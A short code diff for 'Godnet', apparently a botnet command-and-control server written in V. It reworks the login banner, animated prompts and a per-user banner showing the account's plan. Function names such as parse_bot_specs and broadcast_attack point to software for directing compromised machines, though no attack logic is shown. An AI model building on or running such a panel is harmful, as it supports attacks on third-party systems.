@@ -18,7 +18,6 @@ import x.json2 as json
 import src as gn
 
 pub const (
-	banner = "╔═╗╔═╗╔╦╗╔╗╔╔═╗╔╦╗\r\n║ ╦║ ║ ║║║║║║╣  ║ \r\n╚═╝╚═╝═╩╝╝╚╝╚═╝ ╩ \r\n"
 	
 	help	= "Name              Description\r
 ____________________________________________\r
@@ -217,12 +216,15 @@ fn (mut g Godnet) authorize_user(mut client net.TcpConn)
 	gn.set_title(mut client, "Login | Username")
 	gn.loading_bar(mut client)
 
-	gn.animate_listed_text(mut client, "${gn.c_red}${banner}${gn.c_default}", 150)
-	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Username:${gn.c_default}${gn.bg_default} ", 60)
+	for i in ['Initializing Godnet.....\r\n', 'Logging in.....\r\n'] {
+		gn.animate_text(mut client, "${gn.c_red}${i}${gn.c_default}", 150)
+	}
+
+	gn.animate_text(mut client, "└►Username:", 60, gn.bg_red, gn.c_white, " ")
 	username := reader.read_line() or { g.disconnect_socket(mut client) return }
 
 	gn.set_title(mut client, "Login | Password")
-	gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}└►Password:${gn.c_default}${gn.bg_default} ", 60)
+	gn.animate_text(mut client, "└►Password:", 60, gn.bg_red, gn.c_white, " ${gn.c_black}")
 	password := reader.read_line() or { g.disconnect_socket(mut client) return }
 
 	acc := g.find_account(username)
@@ -247,9 +249,12 @@ fn (mut g Godnet) authorize_user(mut client net.TcpConn)
 */
 pub fn (mut g Godnet) input_handler(mut c Client)
 {
+	c.socket.write_string("${gn.clear}") or { 0 }
+	banner_file := (os.read_file("assets/banner.gn") or { "" }).replace("{USER}", "${gn.c_white}${c.info.name}${gn.c_red}").replace("{PLAN}", "${gn.c_white}${c.info.plan}${gn.c_red}")
+	gn.animate_listed_text(mut c.socket, "${gn.c_red}${banner_file}${gn.c_default}", 150)
 	for 
 	{
-		gn.animate_text(mut c.socket, "${gn.bg_red}${gn.c_white}${g.create_hostname(c.info.name)}${gn.c_default}${gn.bg_default} ", 60)
+		gn.animate_text(mut c.socket, "${g.create_hostname(c.info.name)}", 60, gn.c_white, gn.bg_red, " ")
 		data := c.io.read_line() or { g.disconnect_socket(mut c.socket) return }
 		r := gn.new_cmd(data)
 
@@ -347,8 +352,6 @@ pub fn (mut g Godnet) parse_bot_specs(mut b Bot, data string)
 	b.arch 		= json_data[2].replace("arch:", "").trim_space()
 	b.cores 	= json_data[3].replace("cores:", "").trim_space()
 	b.ram 		= json_data[4].replace("ram:", "").trim_space()
-
-	
 }
 
 pub fn (mut g Godnet) broadcast_attack(data string)
